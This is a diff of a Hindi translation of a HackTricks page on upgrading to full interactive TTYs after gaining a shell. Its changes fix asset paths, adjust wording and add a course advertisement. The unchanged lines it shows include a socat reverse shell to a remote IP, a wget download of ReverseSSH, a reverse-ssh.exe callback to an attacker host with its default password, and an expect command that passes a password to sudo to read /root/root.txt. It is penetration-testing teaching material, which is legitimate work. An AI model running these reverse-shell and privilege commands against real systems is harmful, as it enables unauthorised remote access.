@@ -1,23 +1,29 @@
 # Full TTYs
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 ## Full TTY
 
-ध्यान दें कि `SHELL` वेरिएबल में सेट किया गया शेल **ज़रूर** _**/etc/shells**_ के अंदर **सूचीबद्ध** होना चाहिए या `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`। इसके अलावा, ध्यान दें कि अगले स्निप्पेट्स केवल बैश में काम करते हैं। यदि आप ज़श में हैं, तो शेल प्राप्त करने से पहले `bash` चलाकर बैश में बदलें।
+ध्यान दें कि `SHELL` वेरिएबल में सेट किया गया शेल **ज़रूर** _**/etc/shells**_ के अंदर **सूचीबद्ध** होना चाहिए या `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`। इसके अलावा, ध्यान दें कि अगले स्निपेट केवल बैश में काम करते हैं। यदि आप zsh में हैं, तो शेल प्राप्त करने से पहले `bash` चलाकर बैश में बदलें।
 
 #### Python
 
@@ -67,7 +73,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-**इंटरैक्टिव शेल एक्सेस**, साथ ही **फाइल ट्रांसफर** और **पोर्ट फॉरवर्डिंग** के लिए एक सुविधाजनक तरीका है लक्षित पर स्थिर-लिंक्ड ssh सर्वर [ReverseSSH](https://github.com/Fahrj/reverse-ssh) को छोड़ना।
+**इंटरएक्टिव शेल एक्सेस** के लिए एक सुविधाजनक तरीका, साथ ही **फाइल ट्रांसफर** और **पोर्ट फॉरवर्डिंग**, है लक्षित पर स्थिर-लिंक्ड ssh सर्वर [ReverseSSH](https://github.com/Fahrj/reverse-ssh) को छोड़ना।
 
 नीचे `x86` के लिए एक उदाहरण है जिसमें upx-संपीड़ित बाइनरी हैं। अन्य बाइनरी के लिए, [रिलीज़ पृष्ठ](https://github.com/Fahrj/reverse-ssh/releases/latest/) देखें।
 
@@ -93,7 +99,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 ```
 {% endcode %}
 
-* (2b) Windows 10 लक्ष्य (पुरानी संस्करणों के लिए, [प्रोजेक्ट रीडमी](https://github.com/Fahrj/reverse-ssh#features) देखें):
+* (2b) Windows 10 लक्ष्य (पुराने संस्करणों के लिए, [प्रोजेक्ट रीडमी](https://github.com/Fahrj/reverse-ssh#features) देखें):
 
 {% code overflow="wrap" %}
 ```bash
@@ -104,7 +110,7 @@ reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
 {% endcode %}
 
-* यदि ReverseSSH पोर्ट फॉरवर्डिंग अनुरोध सफल रहा, तो आप अब `reverse-ssh(.exe)` चला रहे उपयोगकर्ता के संदर्भ में डिफ़ॉल्ट पासवर्ड `letmeinbrudipls` के साथ लॉग इन करने में सक्षम होना चाहिए:
+* यदि ReverseSSH पोर्ट फॉरवर्डिंग अनुरोध सफल रहा, तो आप अब उपयोगकर्ता के संदर्भ में डिफ़ॉल्ट पासवर्ड `letmeinbrudipls` के साथ लॉग इन करने में सक्षम होना चाहिए जो `reverse-ssh(.exe)` चला रहा है:
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -120,20 +126,26 @@ sftp -P 8888 127.0.0.1
 
 ## No TTY
 
-यदि किसी कारणवश आप पूर्ण TTY प्राप्त नहीं कर सकते हैं, तो आप **अभी भी उन कार्यक्रमों के साथ इंटरैक्ट कर सकते हैं** जो उपयोगकर्ता इनपुट की अपेक्षा करते हैं। निम्नलिखित उदाहरण में, पासवर्ड `sudo` को एक फ़ाइल पढ़ने के लिए पास किया जाता है:
+यदि किसी कारणवश आप पूर्ण TTY प्राप्त नहीं कर सकते हैं, तो आप **फिर भी उन कार्यक्रमों के साथ इंटरैक्ट कर सकते हैं** जो उपयोगकर्ता इनपुट की अपेक्षा करते हैं। निम्नलिखित उदाहरण में, पासवर्ड `sudo` को एक फ़ाइल पढ़ने के लिए पास किया जाता है:
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+अपने **मोबाइल सुरक्षा** में विशेषज्ञता को 8kSec अकादमी के साथ गहरा करें। हमारे आत्म-गति पाठ्यक्रमों के माध्यम से iOS और Android सुरक्षा में महारत हासिल करें और प्रमाणित हों:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 {% hint style="success" %}
-AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS हैकिंग सीखें और अभ्यास करें:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP हैकिंग सीखें और अभ्यास करें: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricks का समर्थन करें</summary>
 
 * [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
-* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
+* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमारा अनुसरण करें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PRs सबमिट करें।
 
 </details>
